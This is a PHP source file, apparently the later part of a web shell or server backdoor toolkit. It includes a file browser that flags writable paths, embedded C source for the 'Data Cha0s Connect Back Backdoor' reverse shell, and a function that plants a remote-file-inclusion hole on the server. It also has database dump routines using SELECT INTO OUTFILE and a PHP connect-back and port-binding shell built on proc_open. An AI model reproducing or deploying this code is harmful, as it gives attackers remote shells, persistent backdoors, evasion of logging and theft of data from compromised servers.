			}
		}
		$dataout .= highlight_file($dest, 1);
	} else {
		$dataout .= "unable to open <b>$dest</b>.\n";
	}
	return $dataout;
}
function show_file($source) {
	$dataout = "";
	if(file_exists($source)) {
		$fh = fopen($source, "r");
		if(!$fh) {
			$dataout .= "unable to open <b>$source</b>.\n";
		} else {
			$read = fread($fh, filesize($source));
			fclose($fh);
			if(!empty($read)) $read = str_replace(">", "&gt;", str_replace("<", "&lt;", $read));
			$dataout .= $read;
		}
	} else {
		$dataout .= "unable to open <b>$source</b>.\n";
	}
	return $dataout;
}
function snoopy($chdir){
	$tmpOut = "";
	global $is_file,$is_dir,$is_w_dir,$is_w_file;
	$fh = opendir("$chdir");
	if($fh!="") {
		while (false !== ($filename = readdir($fh)) ) {
			$FN = $chdir."/".$filename;
			if(@is_file($FN)) $is_file[] = $filename;
			if(@is_dir($FN))  $is_dir[] = $filename;
			if(@is_writable($FN) && @is_dir($filename))  $is_w_dir[] = $filename;
			if(@is_writable($FN) && @is_file($filename)) $is_w_file[] = $filename;
		}
		$tmpOut .=  "<table border=1 cellspacing=1 cellpadding=0><tr>";
		$tmpOut .= echo_files($is_file,  "all files");
		$tmpOut .= echo_files($is_dir,   "only dirs");
		$tmpOut .= echo_files($is_w_dir, "writable dirs");
		$tmpOut .= echo_files($is_w_file,"writable files");
		$tmpOut .= "</tr></table>";
	} else {
		$tmpOut .= "Permission denied.";
	}
	closedir($fh);
	return $tmpOut;
}

function echo_files($arr,$txt){
	$tmpOutMF = "";
	global $chdir,$MyLoc,$SREQ;
	$tmpOutMF .= "<td valign=top>";
	$tmpOutMF .= "<b><font size=2 face=arial>$txt</b> <br><br>";
	if(count($arr) > 0) {
		foreach($arr as $key => $file) {
			$FN = $chdir."/".$file;
			$owner = fileowner($FN);
			$perms = substr(sprintf("%o",fileperms($FN)),-3);
			if(@is_writable($FN) && @is_dir($FN))  $tmpOutMF .=  "<font color=red>$owner - $perms - <a target='_parent' href='$MyLoc?$SREQ&chdir=$FN'>$file</a></font><br>";
			elseif(@is_writable($FN) && @is_file($FN)) $tmpOutMF .=  "<font color=red>$owner - $perms - <a target='_parent' href='$MyLoc?$SREQ&snoop=0&vsource=$FN'>$file</a> </font><br>";
			elseif(@is_file($FN)) $tmpOutMF .=  "<font color=green>$owner - $perms - <a target='_parent' href='$MyLoc?$SREQ&snoop=0&vsource=$FN'>$file</a></font><br>"; 
			elseif(@is_dir($FN))  $tmpOutMF .=  "<font color=blue>$owner - $perms - <a target='_parent' href='$MyLoc?$SREQ&chdir=$FN'>$file</a></font><br>";
		}
	}
    $tmpOutMF .=  "</td>";
    return $tmpOutMF;
}
function print_globals($v) {
	global $a;
	echo "<blockquote>\n";
	$q= "while(list(\$key,\$val) = each($".$v. ") ) { ".
	" echo \"<b>\$key</b>=>\$val.<br>\"; ".
	" if(( is_array(\$val)) && (\$key != \"GLOBALS\")) {".
	" @print_globals( \$v.\"[\".\$key.\"]\" );".
	"}}";
	eval($q);
	echo "</blockquote>\n";
}
######################################################################
# connect back shell function
######################################################################

function connect_back($tmp_dir, $compiler, $host, $port) {
    $shell = "#include <stdio.h>\n" .
             "#include <sys/socket.h>\n" .
             "#include <netinet/in.h>\n" .
             "#include <arpa/inet.h>\n" .
             "#include <netdb.h>\n" .
             "int main(int argc, char **argv) {\n" .
             "  char *host;\n" .
             "  int port = 80;\n" .
             "  int f;\n" .
             "  int l;\n" .
             "  int sock;\n" .
             "  struct in_addr ia;\n" .
             "  struct sockaddr_in sin, from;\n" .
             "  struct hostent *he;\n" .
             "  char msg[ ] = \"Welcome to Data Cha0s Connect Back Shell\\n\\n\"\n" .
             "                \"Issue \\\"export TERM=xterm; exec bash -i\\\"\\n\"\n" .
             "                \"For More Reliable Shell.\\n\"\n" .
             "                \"Issue \\\"unset HISTFILE; unset SAVEHIST\\\"\\n\"\n" .
             "                \"For Not Getting Logged.\\n(;\\n\\n\";\n" .
             "  printf(\"Data Cha0s Connect Back Backdoor\\n\\n\");\n" .
             "  if (argc < 2 || argc > 3) {\n" .
             "    printf(\"Usage: %s [Host] <port>\\n\", argv[0]);\n" .
             "    return 1;\n" .
             "  }\n" .
             "  printf(\"[*] Dumping Arguments\\n\");\n" .
             "  l = strlen(argv[1]);\n" .
             "  if (l <= 0) {\n" .
             "    printf(\"[-] Invalid Host Name\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  if (!(host = (char *) malloc(l))) {\n" .
             "    printf(\"[-] Unable to Allocate Memory\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  strncpy(host, argv[1], l);\n" .
             "  if (argc == 3) {\n" .
             "    port = atoi(argv[2]);\n" .
             "    if (port <= 0 || port > 65535) {\n" .
             "      printf(\"[-] Invalid Port Number\\n\");\n" .
             "      return 1;\n" .
             "    }\n" .
             "  }\n" .
             "  printf(\"[*] Resolving Host Name\\n\");\n" .
             "  he = gethostbyname(host);\n" .
             "  if (he) {\n" .
             "    memcpy(&ia.s_addr, he->h_addr, 4);\n" .
             "  } else if ((ia.s_addr = inet_addr(host)) == INADDR_ANY) {\n" .
             "    printf(\"[-] Unable to Resolve: %s\\n\", host);\n" .
             "    return 1;\n" .
             "  }\n" .
             "  sin.sin_family = PF_INET;\n" .
             "  sin.sin_addr.s_addr = ia.s_addr;\n" .
             "  sin.sin_port = htons(port);\n" .
             "  printf(\"[*] Connecting...\\n\");\n" .
             "  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n" .
             "    printf(\"[-] Socket Error\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {\n" .
             "    printf(\"[-] Unable to Connect\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  printf(\"[*] Spawning Shell\\n\");\n" .
             "  f = fork( );\n" .
             "  if (f < 0) {\n" .
             "    printf(\"[-] Unable to Fork\\n\");\n" .
             "    return 1;\n" .
             "  } else if (!f) {\n" .
             "    write(sock, msg, sizeof(msg));\n" .
             "    dup2(sock, 0);\n" .
             "    dup2(sock, 1);\n" .
             "    dup2(sock, 2);\n" .
             "    execl(\"/bin/sh\", \"shell\", NULL);\n" .
             "    close(sock);\n" .
             "    return 0;\n" .
             "  }\n" .
             "  printf(\"[*] Detached\\n\\n\");\n" .
             "  return 0;\n" .
             "}\n";
    $fbname = $tmp_dir . "/cbs";
	$fp = fopen($fbname . ".c", "w");
	$write = fwrite($fp, $shell);
	fclose($fp);
	if(!empty($write)) {
		$command = $compiler . " -o " . $fbname . " " . $fbname . ".c";
		$execM = test_cmd_shell();
		if($execM > 0) {
			$rtval = Mexec($command, $execM);
			$command = $fbname . " " . $host . " " . $port;
			$rtval .= Mexec($command, $execM);
			return "<pre>" . $rtval . "</pre>";
		} else {
			return "<b>ERROR! No EXEC Avilable!</b>";
		}
		
	} else {
		return "<b>ERROR! Writing data!</b>";
	}
}

######################################################################
# drop mini inc hole
######################################################################
function dropminiinc($location) {
	$Scode = "<?php\n".
		"if (phpversion() <= '4.1.0') \$vars = array_merge(\$HTTP_GET_VARS, \$HTTP_POST_VARS);\n".
		"else \$vars = \$_REQUEST;\n".
		"include(\$vars[inc]);\n".
		"?>\n";
	$fp = fopen($location, "w");
	$write = fwrite($fp, $Scode);
	if(!empty($write)) return "<b>$location</b> copied\n";
	else return "<b>ERROR! Not copied!</b>";
}

######################################################################
# db functions
# unchanged from dans code
######################################################################
function prep_rows($myresult) {
	$dataout = "<table>\n";
	$num_fields = mysql_num_fields($myresult);
	$dataout .= "<tr border=1>\n";
	for($i=0; $i<$num_fields; $i++) $dataout .= "<td>" . mysql_field_name($myresult, $i) . "</td>";
	$dataout .= "</tr>\n";
	while ($line = mysql_fetch_array($myresult, MYSQL_ASSOC)) {
		$dataout .= "<tr>\n";
		foreach($line as $colvalue) {
			$dataout .= "<td>$colvalue</td>\n";
		}
	$dataout .= "</tr>\n";
	}
	$dataout .= "</table>\n";
	return $dataout;
}

function dump_rows($myhost, $myuser, $mypass, $mydb, $mytable, $mydump) {
	$link = mysql_connect($myhost, $myuser, $mypass); // or return "Could not connect";
	mysql_select_db($mydb); //  or return "Could not select database";
	$query = "SELECT * FROM ".$mytable." INTO OUTFILE \"".$mydump."\";";
	$result = mysql_query($query); // or return "Query failed: ".mysql_error();
	mysql_free_result($result);
	mysql_close($link);
	return "Hopefully dumped!";
}

function dump_query($myhost, $myuser, $mypass, $mydb, $mysql, $mydump) {
	$link = mysql_connect($myhost, $myuser, $mypass); // or return "Could not connect";
	mysql_select_db($mydb); //  or return "Could not select database";
	$query = $mysql." INTO OUTFILE \"".$mydump."\";";
	$result = mysql_query($query); // or return "Query failed: ".mysql_error();
	mysql_free_result($result);
	mysql_close($link);
	return "Hopefully dumped!";
}

function display_query($myhost, $myuser, $mypass, $mydb, $mysql) {
	$link = mysql_connect($myhost, $myuser, $mypass); // or return "Could not connect";
	mysql_select_db($mydb); //  or return "Could not select database";
	$query = $mysql;
	$result = mysql_query($query); // or return "Query failed: ".mysql_error();
	$dataouted = prep_rows($result);
	mysql_free_result($result);
	mysql_close($link);
	return($dataouted);
}

function display_rows($myhost, $myuser, $mypass, $mydb, $mytable) {
	$link = mysql_connect($myhost, $myuser, $mypass); // or return "Could not connect";
	mysql_select_db($mydb); //  or return "Could not select database";
	$query = "SELECT * FROM ".$mytable;
	$result = mysql_query($query); // or return "Query failed: ".mysql_error();
	$dataouted = prep_rows($result);
	mysql_free_result($result);
	mysql_close($link);
	return($dataouted);
}

function display_tables($myhost, $myuser, $mypass, $mydb) {
	global $MyLoc,$SREQ;
	$link = mysql_connect($myhost, $myuser, $mypass); // or return "Could not connect";
	$result = mysql_list_tables($mydb);
	if (!$result) {
		return "DB Error, could not list tables";
	}
	$dataout = "<table>\n";
	while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
		$dataout .= "<tr>\n";
		foreach ($line as $col_value) {
			$dataout .= "<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incdbpass=$mypass&incdbname=$mydb&incdbtable=$col_value'>$col_value</a></td>\n";
		}
	$dataout .= "</tr>\n";
	}
	$dataout .= "</table>\n";
	mysql_free_result($result);
	mysql_close($link);
	return($dataout);
}

function display_dbs($myhost, $myuser, $mypass) {
	global $MyLoc,$SREQ;
	$link = mysql_connect($myhost, $myuser, $mypass);
	$result = mysql_list_dbs($link);
	if (!$result) {
		return "DB Error, could not list databases";
	}
	$dataout = "<table>\n";
	while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
		$dataout .= "<tr>\n";
		foreach ($line as $col_value) {
			$dataout .= "<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incdbpass=$mypass&incdbname=$col_value'>$col_value</a></td>\n";
		}
	$dataout .= "</tr>\n";
	}
	$dataout .= "</table>\n";
	mysql_free_result($result);
	mysql_close($link);
	return($dataout);
}

function Odisplay_rows($myhost, $myuser, $mypass, $mydb, $mytable) {
	$link = odbc_connect($myhost, $myuser, $mypass); // or return "Could not connect";
	$query = "SELECT * FROM ".$mytable;
	$result = odbc_exec($link, $query); // or return "Query failed: ".mysql_error();
	$dataout = "<table>\n";
	while ($line = odbc_fetch_row($result, MYSQL_ASSOC)) {
		$dataout = $dataout . "<tr>\n";
		foreach($line as $colvalue) {
			$dataout = $dataout . "<td>$colvalue</td>\n";
		}
	$dataout = $dataout . "</tr>\n";
	}
	$dataout = $dataout . "</table>\n";
	return($dataout);
}

function Odisplay_tables($myhost, $myuser, $mypass) {
	$link = odbc_connect($myhost, $myuser, $mypass); // or return "Could not connect";
	$result = odbc_tables($link);
	if (!$result) {
		return "DB Error, could not list tables";
	}
	$dataout = "<table>\n";
	while ($line = odbc_fetch_row($result, MYSQL_ASSOC)) {
		if(odbc_result($line, 4) == "TABLE") {
			$dataout = $dataout . "<tr>\n";
			$dataout = $dataout . "<td>" . odbc_result($tablelist, 3) ."</td>\n"; 
		}
		$dataout = $dataout . "</tr>\n";
	}
	$dataout = $dataout . "</table>\n";
	return($dataout);
}

######################################################################
# Dan's Network function Wrappers
# Initial use inside this script, need to handle the error data 
# differently to get it included in the base 64 output!
######################################################################

function DB_NET_GET_SOCKET_PROTOCOL($prot) {
	switch($prot) {
		case "udp":
			$protocol = SOL_UDP;
			$socktype = SOCK_DGRAM;
		break;
		case "tcp":
		default:
			$protocol = SOL_TCP;
			$socktype = SOCK_STREAM;
		break;
	}
	return(array($protocol, $socktype));
}

function DB_NET_CONNECT($hostname, $port=80, $prot="tcp") {
	$address = gethostbyname($hostname);
	list($protocol, $socktype) = DB_NET_GET_SOCKET_PROTOCOL($prot);
	switch($prot) {
		case "udp":
			$protocol = SOL_UDP;
			$socktype = SOCK_DGRAM;
		break;
		case "tcp":
		default:
			$protocol = SOL_TCP;
			$socktype = SOCK_STREAM;
		break;
	}
	$socket = socket_create(AF_INET, $socktype, $protocol);
	if ($socket < 0) {
		echo "socket_create() failed: reason: " . socket_strerror($socket) . "\n";
	}

	$result = socket_connect($socket, $address, $port);
	if ($result < 0) {
		echo "socket_connect() failed.\nReason: ($result) " . socket_strerror($result) . "\n";
	}
	return $socket;
}

function DB_NET_LISTEN($address, $port) {
	if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) < 0) {
		echo "socket_create() failed: reason: " . socket_strerror($sock) . "\n";
		return(-1);
	}

	if (($ret = socket_bind($sock, $address, $port)) < 0) {
		echo "socket_bind() failed: reason: " . socket_strerror($ret) . "\n";
		return(-2);
	}

	if (($ret = socket_listen($sock, 5)) < 0) {
		echo "socket_listen() failed: reason: " . socket_strerror($ret) . "\n";
		return(-3);
	}

	return($sock);
}

######################################################################
# Dan's PHP Connect Back / Port Binding Shell!
# Yes that right a REAL shell!
# Now I had this idea for ages, finally coded it 6 months ago, and 
# it's never really been used.
# Not really brain science but when there are many examples of PHP 
# sockets + proc_open it's a little harder.
######################################################################

function DB_Shell($type, $shell, $port, $host = "0.0.0.0") {
	if($type == "cb" && $host != "0.0.0.0") {
		$procsock = DB_NET_CONNECT($host, $port, "tcp");
	} elseif ($type == "pb") {
		$lsock = DB_NET_LISTEN($host, $port);
		if (($procsock = socket_accept($lsock)) < 0) {
    		return "socket_accept() failed: reason: " . socket_strerror($procsock) . "\n";
    	}
	} else {
		return "Error no connection details specified!";
	}

	set_time_limit(9000);
	$descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
	);
	$process = proc_open($shell, $descriptorspec, $pipes);
	if (is_resource($process)) {
		$tmp_loop = 1;
		do {
			$tmp_array = array($procsock);
			$num_changed_sockets = socket_select($tmp_array, $write = NULL, $except = NULL, 0);
			if ($num_changed_sockets === false) {
				$tmp_loop = 0;
			} else if ($num_changed_sockets > 0) {
				foreach($tmp_array as $k => $v) {
					if($v == $procsock) {
						if(socket_last_error($procsock) > 0) $tmp_loop = 0;
						if($tmp_loop == 1 && false == ($buf = socket_read($procsock, 2048, PHP_NORMAL_READ))) $tmp_loop = 0;
						fwrite($pipes[0], $buf);
					}
				}
			}
			$tmp_arrayS = array($pipes[1], $pipes[2]);
			$num_changed_streams = stream_select($tmp_arrayS, $write = NULL, $except = NULL, 0);
			if ($num_changed_streams === FALSE) {
				$tmp_loop = 0;
			} else if ($num_changed_streams > 0) {
				foreach($tmp_arrayS as $k => $v) {
					if($tmp_loop == 1 && false == ($buf = fread($v, 2048))) $tmp_loop = 0;
					socket_write($procsock, $buf, strlen($buf));
				}
			}
		} while($tmp_loop == 1);
	} else {
		return "Error executing shell " . $shell;
	}
}

?>
